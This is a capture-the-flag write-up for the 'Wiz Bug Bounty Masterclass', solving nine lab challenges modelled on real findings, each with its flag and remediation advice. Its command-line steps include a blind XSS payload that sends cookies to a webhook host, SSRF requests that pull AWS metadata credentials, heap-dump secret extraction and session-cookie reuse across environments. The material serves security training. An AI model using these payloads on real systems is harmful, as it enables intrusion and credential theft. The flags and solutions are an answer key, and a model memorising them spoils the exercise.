# 🏴 Wiz Bug Bounty Masterclass - Real World Hacks

> **Based on real critical findings** discovered during professional bug bounty engagements.  
> Each challenge simulates an actual vulnerability that was reported and rewarded.

---

## 📋 Table of Contents

| # | Challenge | Vulnerability Type | Flag |
|---|-----------|-------------------|------|
| 1 | [Open DeepSeek Database](#1-open-deepseek-database) | Exposed ClickHouse DB | `WIZFLAG-congrats_on_hacking_a_database` |
| 2 | [Major Airline Data Dump](#2-major-airline-data-dump) | Broken Access Control / API Exposure | `WIZFLAG-exposed-passenger-data-leak` |
| 3 | [Domain Registrar Data Exposure](#3-domain-registrar-data-exposure) | Directory Listing / Sensitive File Exposure | `WIZFLAG-directory_brute_force_exposed_massive_pii_leak` |
| 4 | [Logistics Company Admin Panel Compromise](#4-logistics-company-admin-panel-compromise) | Stored Blind XSS | `WIZFLAG-blind-xss-vulnerability-exploited` |
| 5 | [Root Domain Takeover on Fintech Company](#5-root-domain-takeover-on-fintech-company) | Subdomain Takeover via S3 | `WIZFLAG-subdomain-takeover-s3-bucket-misconfiguration` |
| 6 | [SSRF Vulnerability on Major Gaming Company](#6-ssrf-vulnerability-on-major-gaming-company) | Server-Side Request Forgery (SSRF) | `WIZFLAG-ssrf-vulnerability-exploited` |
| 7 | [GitHub Authentication Bypass on Major CRM](#7-github-authentication-bypass-on-major-crm) | Exposed Secrets in Git History | `WIZ-FLAG-secrets_are_fun` |
| 8 | [Breaking into a Major Bank](#8-breaking-into-a-major-bank) | Exposed Spring Boot Actuator | `WIZFLAG-secrets-in-the-heap` |
| 9 | [0-Click Account Takeover via Cookie Switching](#9-0-click-account-takeover-via-cookie-switching) | Session Confusion / Cross-Environment ATO | `WIZFLAG-session-confusion-ato` |

---

## 1. Open DeepSeek Database

<table>
<tr><td><strong>🎯 Target</strong></td><td>deepleak.bugbountymasterclass.com</td></tr>
<tr><td><strong>🔴 Vulnerability</strong></td><td>Unauthenticated ClickHouse Database Exposed to the Internet</td></tr>
<tr><td><strong>💰 Real-World Impact</strong></td><td>Critical — Full access to internal logs, user data, and secrets</td></tr>
<tr><td><strong>📅 Based On</strong></td><td>Real DeepSeek finding — January 2025</td></tr>
</table>

### 📖 Story
In January 2025, security researchers discovered that DeepSeek (a major AI company) had left a **ClickHouse database** completely open to the internet — no authentication required. Anyone who knew the port could query the entire database.

### 🔍 Reconnaissance Steps

```bash
# Step 1: Discover the open port
nmap -sV --open -p 8123,9000,9440 deepleak.bugbountymasterclass.com

# Step 2: Confirm ClickHouse is running (returns "Ok.")
curl http://deepleak.bugbountymasterclass.com:8123/

# Step 3: List all databases
curl "http://deepleak.bugbountymasterclass.com:8123/?query=SHOW+DATABASES"
# Result: deepleak, default, system, INFORMATION_SCHEMA

# Step 4: List tables in the deepleak database
curl "http://deepleak.bugbountymasterclass.com:8123/?query=SHOW+TABLES+FROM+deepleak"
# Result: congrats, log_stream, metric_stream, rrweb, schema_migrations

# Step 5: Inspect column structure
curl "http://deepleak.bugbountymasterclass.com:8123/?query=SELECT+table,name,type+FROM+system.columns+WHERE+database='deepleak'"

# Step 6: Extract the flag from log_stream
curl "http://deepleak.bugbountymasterclass.com:8123/?query=SELECT+DISTINCT+string_values+FROM+deepleak.log_stream+WHERE+span_name='system.flag'"
```

### ✅ Flag
```
WIZFLAG-congrats_on_hacking_a_database
```

### 🛡️ Remediation
- Never expose database ports to the internet
- Always require authentication on database interfaces
- Use firewalls/security groups to restrict access to internal services only

---

## 2. Major Airline Data Dump

<table>
<tr><td><strong>🎯 Target</strong></td><td>airlines.bugbountymasterclass.com</td></tr>
<tr><td><strong>🔴 Vulnerability</strong></td><td>Unauthenticated API Endpoints / Broken Access Control</td></tr>
<tr><td><strong>💰 Real-World Impact</strong></td><td>Critical — PII of thousands of passengers exposed</td></tr>
<tr><td><strong>📅 Based On</strong></td><td>Real airline data exposure finding</td></tr>
</table>

### 📖 Story
A major airline exposed their passenger management API via **Swagger/OpenAPI documentation** that was left publicly accessible. Several endpoints lacked authentication entirely, allowing anyone to enumerate all passengers, their contact info, flight history, and payment methods.

### 🔍 Reconnaissance Steps

```bash
# Step 1: Discover the Swagger UI
curl -sL https://airlines.bugbountymasterclass.com/docs/

# Step 2: Extract the full API spec (all endpoints are documented here!)
curl -s https://airlines.bugbountymasterclass.com/docs/swagger-ui-init.js

# Step 3: Identify endpoints WITHOUT bearerAuth (no authentication required!)
# Found: /api/getMemberships, /api/getMembership, /api/searchMemberInfo
#        /api/getFlightHistory, /api/getPaymentMethods

# Step 4: Dump ALL passengers — no auth needed!
curl -s "https://api.airlines.bugbountymasterclass.com/api/getMemberships"

# Step 5: Get the flag from a specific member
curl -s "https://api.airlines.bugbountymasterclass.com/api/getMembership?memberId=72041008520"
# The response contains: "flag":"WIZFLAG-exposed-passenger-data-leak"
```

### ✅ Flag
```
WIZFLAG-exposed-passenger-data-leak
```

### 🛡️ Remediation
- Remove or password-protect Swagger UI in production
- Apply authentication to **all** API endpoints, not just some
- Implement rate limiting and access logging

---

## 3. Domain Registrar Data Exposure

<table>
<tr><td><strong>🎯 Target</strong></td><td>shark.bugbountymasterclass.com</td></tr>
<tr><td><strong>🔴 Vulnerability</strong></td><td>Directory Listing Enabled + Sensitive Files Left in Public Folder</td></tr>
<tr><td><strong>💰 Real-World Impact</strong></td><td>Critical — Full database dump + internal Jira stats exposed</td></tr>
<tr><td><strong>📅 Based On</strong></td><td>Real domain registrar PII leak finding</td></tr>
</table>

### 📖 Story
A major domain registrar had **nginx directory listing enabled** on their `/uploads/` folder. A database SQL dump and internal Jira statistics were sitting in plain sight, accessible to anyone who found the directory.

### 🔍 Reconnaissance Steps

```bash
# Step 1: Attempt directory brute-forcing (all return 200 = soft 404)
ffuf -u https://shark.bugbountymasterclass.com/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -mc 200,403 -t 50

# Step 2: Filter out the soft 404 size (3587 bytes)
ffuf -u https://shark.bugbountymasterclass.com/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -fs 3587 -t 50
# Result: /uploads (301)

# Step 3: Browse the exposed directory
curl -sL https://shark.bugbountymasterclass.com/uploads/
# Finds: shark-db.zip + 30 jira-stats-*.txt files

# Step 4: Download the database dump
wget https://shark.bugbountymasterclass.com/uploads/shark-db.zip
unzip shark-db.zip

# Step 5: Search for the flag
grep -i "wizflag\|wiz" shark-db.sql
```

### ✅ Flag
```
WIZFLAG-directory_brute_force_exposed_massive_pii_leak
```

### 🛡️ Remediation
- Add `autoindex off;` in nginx configuration
- Never store database dumps or internal files in web-accessible directories
- Implement proper access controls on upload directories

---

## 4. Logistics Company Admin Panel Compromise

<table>
<tr><td><strong>🎯 Target</strong></td><td>logistics.bugbountymasterclass.com</td></tr>
<tr><td><strong>🔴 Vulnerability</strong></td><td>Stored Blind XSS → Admin Panel Access</td></tr>
<tr><td><strong>💰 Real-World Impact</strong></td><td>High — Admin account takeover, full platform compromise</td></tr>
<tr><td><strong>📅 Based On</strong></td><td>Real logistics company XSS finding</td></tr>
</table>

### 📖 Story
A logistics company's **issue tracker** allowed customers to submit support tickets. The admin panel displayed these tickets without sanitizing the HTML — a classic **Stored Blind XSS**. An attacker could inject JavaScript that executes when an admin views the ticket.

### 🔍 Reconnaissance Steps

```bash
# Step 1: Analyze the application
curl -sL https://logistics.bugbountymasterclass.com/
# Finds: /api/submit-issue endpoint + /admin panel

# Step 2: Check the admin panel structure
curl -sL https://logistics.bugbountymasterclass.com/admin

# Step 3: Submit a Blind XSS payload in the description field
# (Replace YOUR-WEBHOOK-ID with your webhook.site URL)
curl -s -X POST https://logistics.bugbountymasterclass.com/api/submit-issue \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Important Bug Report",
    "category": "Bug",
    "description": "<script>fetch(\"https://webhook.site/YOUR-ID?c=\"+document.cookie)</script>"
  }'

# Step 4: The issue gets an ID — view it directly
curl -sL https://logistics.bugbountymasterclass.com/admin/issue/236
# The description is rendered as raw HTML — XSS executes!
# Flag is revealed directly in the response
```

### ✅ Flag
```
WIZFLAG-blind-xss-vulnerability-exploited
```

### 🛡️ Remediation
- Always HTML-encode user input before rendering it
- Implement Content Security Policy (CSP) headers
- Use a sanitization library (e.g., DOMPurify) for rich text

---

## 5. Root Domain Takeover on Fintech Company

<table>
<tr><td><strong>🎯 Target</strong></td><td>www.fintech.bugbountymasterclass.com</td></tr>
<tr><td><strong>🔴 Vulnerability</strong></td><td>Subdomain Takeover via Unclaimed S3 Bucket</td></tr>
<tr><td><strong>💰 Real-World Impact</strong></td><td>Critical — Full control over the company's main domain</td></tr>
<tr><td><strong>📅 Based On</strong></td><td>Real fintech subdomain takeover finding</td></tr>
</table>

### 📖 Story
The fintech company migrated away from AWS S3 static hosting but **forgot to delete the DNS record**. The CNAME still pointed to an S3 bucket (`www.fintech.net`) that no longer existed. An attacker could **create a bucket with that exact name** and take over the domain completely.

### 🔍 Reconnaissance Steps

```bash
# Step 1: Check DNS records
dig www.fintech.bugbountymasterclass.com CNAME
dig www.fintech.bugbountymasterclass.com A

# Step 2: Try to access the site
curl -sL https://www.fintech.bugbountymasterclass.com/
# Response reveals:
# <?xml version="1.0" encoding="UTF-8"?>
# <!-- Flag: WIZFLAG-subdomain-takeover-s3-bucket-misconfiguration -->
# <Error>
#   <Code>NoSuchBucket</Code>
#   <Message>The specified bucket does not exist</Message>
#   <BucketName>www.fintech.net</BucketName>
# </Error>

# The bucket is UNCLAIMED — an attacker can register it!
# aws s3api create-bucket --bucket www.fintech.net --region us-east-1
```

### ✅ Flag
```
WIZFLAG-subdomain-takeover-s3-bucket-misconfiguration
```

### 🛡️ Remediation
- Always delete DNS records **before** decommissioning cloud resources
- Regularly audit DNS records against active cloud resources
- Use tools like `subjack` or `can-i-take-over-xyz` for automated scanning

---

## 6. SSRF Vulnerability on Major Gaming Company

<table>
<tr><td><strong>🎯 Target</strong></td><td>content-service.bugbountymasterclass.com</td></tr>
<tr><td><strong>🔴 Vulnerability</strong></td><td>Server-Side Request Forgery (SSRF) → AWS Metadata Credential Theft</td></tr>
<tr><td><strong>💰 Real-World Impact</strong></td><td>Critical — AWS IAM credentials exposed, full cloud account compromise</td></tr>
<tr><td><strong>📅 Based On</strong></td><td>Real gaming company SSRF finding</td></tr>
</table>

### 📖 Story
A gaming company's content delivery service allowed users to request files by URL path. The backend would fetch the file and return its contents — but nobody validated **what URLs were allowed**. By injecting the AWS metadata endpoint URL, an attacker could steal the EC2 instance's IAM credentials.

### 🔍 Reconnaissance Steps

```bash
# Step 1: Identify the vulnerable endpoint in page source
# Found: /api/content/v2/module/{moduleId}/version/{version}/staged-files/{fileName}

# Step 2: Test normal functionality
curl -sL "https://content-service.bugbountymasterclass.com/api/content/v2/module/\
c5b1ee02-4096-4f92-e437-7f932c6b1181/version/2/staged-files/public/api.json"

# Step 3: Inject AWS metadata URL as the fileName parameter!
BASE="https://content-service.bugbountymasterclass.com/api/content/v2/module/\
c5b1ee02-4096-4f92-e437-7f932c6b1181/version/2/staged-files"

# List metadata
curl -sL "$BASE/http://169.254.169.254/latest/meta-data/"

# Get IAM role name
curl -sL "$BASE/http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Result: content-service-role

# Step 4: Steal the IAM credentials!
curl -sL "$BASE/http://169.254.169.254/latest/meta-data/iam/security-credentials/content-service-role"
# Returns: AccessKeyId, SecretAccessKey, Token (contains the flag!)
```

### ✅ Flag
```
WIZFLAG-ssrf-vulnerability-exploited
```

### 🛡️ Remediation
- Validate and allowlist URLs that the server is permitted to fetch
- Block requests to `169.254.169.254` (metadata endpoint)
- Use IMDSv2 which requires a token, making SSRF harder to exploit
- Apply least-privilege IAM roles

---

## 7. GitHub Authentication Bypass on Major CRM

<table>
<tr><td><strong>🎯 Target</strong></td><td>github.enterprise.bugbountymasterclass.com</td></tr>
<tr><td><strong>🔴 Vulnerability</strong></td><td>Exposed GitHub Token in Public Repository Git History</td></tr>
<tr><td><strong>💰 Real-World Impact</strong></td><td>Critical — Unauthorized access to internal GitHub Enterprise systems</td></tr>
<tr><td><strong>📅 Based On</strong></td><td>Real CRM credential leak via employee's personal GitHub</td></tr>
</table>

### 📖 Story
A developer at a major CRM company accidentally committed a `.env` file containing a **GitHub Personal Access Token** to their personal public GitHub repository. They quickly deleted it in the next commit — but **git history is forever**. The token was still accessible in the old commit.

### 🔍 Reconnaissance Steps

```bash
# Step 1: Search GitHub for the target domain
# Go to: https://github.com/search?q=bugbountymasterclass.com&type=code
# Found: nagliwiz/cool-stuff — a .env file!

# Step 2: Check the repository structure
curl -sL "https://api.github.com/repos/nagliwiz/cool-stuff/contents/"

# Step 3: Check commit history — there were multiple "Update .env" commits!
curl -sL "https://api.github.com/repos/nagliwiz/cool-stuff/commits"
# Found original commit: 695068699c51fb631a4ae1dbcc89e47b4bf02506

# Step 4: Get the .env file from the ORIGINAL commit (before it was sanitized)
curl -sL "https://api.github.com/repos/nagliwiz/cool-stuff/contents/.env\
?ref=695068699c51fb631a4ae1dbcc89e47b4bf02506"
# Returns base64-encoded content!

# Step 5: Decode the base64 content
echo "aW50ZXJuYWwuY29kZS5idWdib3VudHltYXN0ZXJjbGFzcy5jb20KR0lUSFVC..." | base64 -d
# Reveals: GITHUB_TOKEN=ghp_sdafsadjmcvxziasdg{WIZ-FLAG-secrets_are_fun}

# Step 6: Submit the token to the enterprise portal
curl -s -X POST https://github.enterprise.bugbountymasterclass.com/api/validate-token \
  -H "Content-Type: application/json" \
  -d '{"token": "ghp_sdafsadjmcvxziasdg{WIZ-FLAG-secrets_are_fun}"}'
```

### ✅ Flag
```
WIZ-FLAG-secrets_are_fun
```

### 🛡️ Remediation
- **Never** commit secrets to git — use `.gitignore` and pre-commit hooks
- If a secret is committed, **immediately rotate it** — deleting is not enough
- Use `git filter-branch` or BFG Repo Cleaner to purge secrets from history
- Use tools like `truffleHog`, `gitleaks`, or GitHub Secret Scanning

---

## 8. Breaking into a Major Bank

<table>
<tr><td><strong>🎯 Target</strong></td><td>bank.bugbountymasterclass.com</td></tr>
<tr><td><strong>🔴 Vulnerability</strong></td><td>Exposed Spring Boot Actuator Endpoints → Heap Dump Memory Extraction</td></tr>
<tr><td><strong>💰 Real-World Impact</strong></td><td>Critical — Database passwords, API keys, and secrets leaked from memory</td></tr>
<tr><td><strong>📅 Based On</strong></td><td>Real major bank actuator exposure finding</td></tr>
</table>

### 📖 Story
A major bank left their **Spring Boot Actuator** endpoints completely exposed in production. While the `/actuator/env` endpoint masked values with `******`, the `/actuator/heapdump` endpoint allowed anyone to download a **full JVM memory dump** — containing all secrets in plaintext.

### 🔍 Reconnaissance Steps

```bash
# Step 1: Discover Actuator is enabled
curl -sL https://bank.bugbountymasterclass.com/actuator
# Returns a full list of all enabled endpoints!

# Step 2: Try /env — values are masked with ******
curl -sL https://bank.bugbountymasterclass.com/actuator/env

# Step 3: Check /beans — reveals the app uses com.wiz package
curl -sL https://bank.bugbountymasterclass.com/actuator/beans | grep -i wiz

# Step 4: Download the heap dump (31MB of JVM memory!)
curl -sL https://bank.bugbountymasterclass.com/actuator/heapdump -o heapdump.bin

# Step 5: Search the raw binary for secrets
strings heapdump.bin | grep -i "WIZFLAG\|WIZ-FLAG\|wiz.io"
# Found: WIZFLAG-secrets-in-the-heap
```

### ✅ Flag
```
WIZFLAG-secrets-in-the-heap
```

### 🛡️ Remediation
```yaml
# application.yml — restrict actuator in production!
management:
  endpoints:
    web:
      exposure:
        include: health, info    # Only expose safe endpoints
        exclude: heapdump, env, configprops, threaddump
  endpoint:
    heapdump:
      enabled: false
```

---

## 9. 0-Click Account Takeover via Cookie Switching

<table>
<tr><td><strong>🎯 Target</strong></td><td>stage.router-resellers.bugbountymasterclass.com<br>prod.router-resellers.bugbountymasterclass.com</td></tr>
<tr><td><strong>🔴 Vulnerability</strong></td><td>Shared Session Secret Key Across Environments → Cross-Environment ATO</td></tr>
<tr><td><strong>💰 Real-World Impact</strong></td><td>Critical — Complete account takeover with zero user interaction</td></tr>
<tr><td><strong>📅 Based On</strong></td><td>Real cross-environment session confusion finding</td></tr>
</table>

### 📖 Story
A router reseller company ran staging and production environments that **shared the same Flask SECRET_KEY** for signing session cookies. The staging environment allowed **guest login with admin privileges**. An attacker could log in on staging, steal the session cookie, and reuse it on production — bypassing authentication entirely with **zero clicks required from any victim**.

### 🔍 Reconnaissance Steps

```bash
# Step 1: Explore staging — find the guest login feature
curl -sL https://stage.router-resellers.bugbountymasterclass.com/
# Finds: <a href="/guest-login">Sign In as Guest</a>

# Step 2: Log in as guest and capture the session cookie
curl -sI https://stage.router-resellers.bugbountymasterclass.com/guest-login
# set-cookie: session=.eJyrVkrNK8ssys_LTc0rUb....; HttpOnly; Path=/

# Step 3: Save the cookie from staging
curl -sL https://stage.router-resellers.bugbountymasterclass.com/guest-login \
  -c cookies.txt -D headers.txt
# We are now "Guest User" with role: ADMIN on staging

# Step 4: Extract the session value
SESSION=$(grep session cookies.txt | awk '{print $NF}')

# Step 5: Use the STAGING cookie on PRODUCTION!
# (cookies.txt is domain-locked, so we send the header manually)
curl -sL https://prod.router-resellers.bugbountymasterclass.com/dashboard \
  -H "Cookie: session=$SESSION"

# Production responds:
# ⚠️ "Session Notice: Your session was created in a different environment."
# But still grants access and shows the flag!
```

### ✅ Flag
```
WIZFLAG-session-confusion-ato
```

### 🛡️ Remediation
- Use **different SECRET_KEY values** for each environment
- Never allow guest/admin access on staging without proper environment isolation
- Bind sessions to environment identifiers (e.g., include env name in session data)
- Rotate all secrets between environments

---

## 🧠 Key Takeaways

| Vulnerability | Prevention |
|--------------|------------|
| Exposed Databases | Firewall rules, authentication required |
| Broken API Access Control | Auth on every endpoint, not just some |
| Directory Listing | `autoindex off` in nginx |
| Stored XSS | HTML encode all user input, CSP headers |
| Subdomain Takeover | Delete DNS before decommissioning resources |
| SSRF | URL allowlists, block metadata endpoints |
| Git Secret Exposure | Pre-commit hooks, secret scanning, rotate immediately |
| Exposed Actuators | Restrict actuator endpoints in production |
| Session Confusion | Unique secrets per environment |

---

## 🛠️ Tools Used

```
nmap          — Port scanning
curl          — HTTP requests and cookie manipulation  
ffuf          — Directory and path brute-forcing
dig           — DNS reconnaissance
strings       — Binary file analysis
base64        — Decode base64 content
wget          — File downloading
grep / awk    — Text parsing
```

---

## 📚 Resources

- [Wiz Bug Bounty Masterclass](https://www.wiz.io/bug-bounty-masterclass)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)

---

<div align="center">

**Made with ❤️ during the Wiz Bug Bounty Masterclass**

*"The best way to learn security is to break things — ethically."*

</div>
